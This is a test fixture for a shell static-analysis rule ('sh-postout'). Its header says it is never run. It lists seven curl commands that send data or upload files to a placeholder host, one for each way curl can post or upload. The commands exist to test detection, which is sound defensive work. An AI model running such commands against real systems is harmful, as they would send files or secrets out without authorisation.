#!/bin/sh
# Fixture only — never executed. One annotated instance per alternative of the rule
# named in the file name; `# ruleid:` names the rule the next line must draw.
# ruleid: sh-postout
curl -X POST -d "$DATA" https://example.invalid/collect
# ruleid: sh-postout
curl --data "$DATA" https://example.invalid/collect
# ruleid: sh-postout
curl --data-binary @$FILE https://example.invalid/collect
# ruleid: sh-postout
curl -F "file=@$FILE" https://example.invalid/collect
# ruleid: sh-postout
curl --form "file=@$FILE" https://example.invalid/collect
# ruleid: sh-postout
curl -T "$FILE" https://example.invalid/collect
# ruleid: sh-postout
curl --upload-file "$FILE" https://example.invalid/collect
